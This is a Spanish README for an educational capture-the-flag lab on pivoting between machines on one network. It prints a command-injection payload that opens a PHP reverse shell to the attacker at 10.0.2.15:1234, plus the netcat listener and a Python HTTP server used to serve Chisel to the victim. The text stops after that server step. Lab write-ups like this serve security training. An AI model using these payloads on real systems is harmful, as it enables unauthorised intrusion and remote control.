# CTF-4
*Capture the flag* donde se trabaja el *pivoting* entre máquinas de la misma red, *reverse shell*, 
<div>
  <img src="https://img.shields.io/badge/-Kali-5e8ca8?style=for-the-badge&logo=kalilinux&logoColor=white" />
  <img src="https://img.shields.io/badge/-PHP-777BB4?style=for-the-badge&logo=php&logoColor=white" />
  <img src="https://img.shields.io/badge/-Netcat-F5455C?style=for-the-badge&logo=netcat&logoColor=white" />
  <img src="https://img.shields.io/badge/-python-3776AB?style=for-the-badge&logo=python&logoColor=white" />
  chisel
  <img src="https://img.shields.io/badge/-Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white" />
</div>
## Objetivo

Explicar la realización del siguiente _Capture the flag_ dentro del mundo educativo. Se pretenden conseguir un archivo (_flags_), dentro del entorno del usuario básico. Para ello, se deberá pivotar desde la máquina resuelta en el [CTF-3](https://github.com/Cibersegurata39/CTF-3) a la máquina de este nuevo reto y una vez dentro pasar al usuario básico.

## Que hemos aprendido?

- Realizar un *pivoting* entre dos máquinas de la misma red.
- Realizar una *reverse shell* con código *php*.
- Poner puertos en escucha.
- Montar un sevidor fácilmente con *Python*.

## Herramientas utilizadas

- *Kali Linux*.
- *Pivoting*: *Chisel*, *Python3*.
- Penetración: *Netcat* . 

## Steps

### Vulnerabilidades explotadas

Partiendo del primer formulario encontrado en el CTF-3, ejecuto una *reverse shell* con código **php**, indicando la dirección IP y el puerto de la máquina local que estará escuchando.

<code>;ls;php -r '$sock=fsockopen("10.0.2.15",1234);exec("/bin/sh -i <&3 >&3 2>&3");';</code>

![image](https://github.com/user-attachments/assets/8ec4b208-1dd2-47d4-8f79-9155f6f56acf)

Para poner en escucha el puerto 1234, utilizo **Netcat**.

<code>nc -lvnp 1234</code>

![image](https://github.com/user-attachments/assets/9eaefd34-4035-4094-af1e-db536c3b4a07)

Para **pivotar** entre máquinas, es necesario descargar el programa **Chisel** en la máquina atacante. Puesto que también se necesita en la máquina víctima, se crea un servidor con **Pyhotn3** desde la carpeta donde se encuentra *Chisel* (máquina atacante). Este sevidor es necesario para poder descargar el programa en la máquina víctima, ya que no dispone de esta herramienta.

<code>python3 -m http.server 8080</code>

![image](https://github.com/user-attachments/assets/7f85fb6c-c443-49e6-9a1f-174109bea616)

